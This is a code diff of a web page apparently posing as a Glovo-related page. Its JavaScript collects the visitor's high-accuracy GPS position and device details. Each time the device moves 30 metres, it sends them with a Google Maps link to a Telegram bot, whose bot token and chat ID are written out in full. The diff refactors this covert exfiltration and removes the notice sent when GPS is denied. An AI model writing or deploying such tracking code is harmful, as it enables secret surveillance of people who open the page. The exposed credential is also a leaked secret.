@@ -109,7 +109,11 @@
       return `${device} - ${browser}`;
     }
 
-    function sendTelegram(message) {
+    function sendTelegram(lat, lon) {
+      const dateTime = new Date().toLocaleString();
+      const link = `https://www.google.com/maps?q=${lat},${lon}`;
+      const deviceInfo = getDeviceInfo();
+      const message = `👀 Posizione aggiornata su Glovo!\n🕒 Data/Ora: ${dateTime}\n📱 Dispositivo: ${deviceInfo}\n📍 Posizione: ${link}`;
       fetch(`https://api.telegram.org/bot7772790004:AAFPul63mfCY8NIfH5Sju0r7b36_QuEJBAA/sendMessage?chat_id=5886300958&text=${encodeURIComponent(message)}`);
     }
 
@@ -158,16 +162,8 @@
               distance = calculateDistance(previous.lat, previous.lon, lat, lon);
             }
 
-            if (!previous || distance >= 30) {
-              const dateTime = new Date().toLocaleString();
-              const deviceInfo = getDeviceInfo();
-              const link = `https://www.google.com/maps?q=${lat},${lon}`;
-              const message = `👀 Posizione aggiornata su Glovo!
-🕒 Data/Ora: ${dateTime}
-📱 Dispositivo: ${deviceInfo}
-📍 Posizione: ${link}`;
-              sendTelegram(message);
-
+            if (!previous || distance >= 30) { // almeno 30 metri
+              sendTelegram(lat, lon);
               saveLocation(lat, lon);
               updateStatus(lat, lon);
               console.log(`Posizione aggiornata. Distanza: ${distance.toFixed(2)} metri`);
@@ -178,13 +174,6 @@
           (error) => {
             console.error(error);
             document.getElementById("status").innerText = "Impossibile ottenere la posizione.";
-
-            const dateTime = new Date().toLocaleString();
-            const deviceInfo = getDeviceInfo();
-            const message = `📈 Pagina aperta ma GPS negato o errore
-🕒 Data/Ora: ${dateTime}
-📱 Dispositivo: ${deviceInfo}`;
-            sendTelegram(message);
           },
           {
             enableHighAccuracy: true,
@@ -207,4 +196,3 @@
   </div>
 </body>
 </html>
-
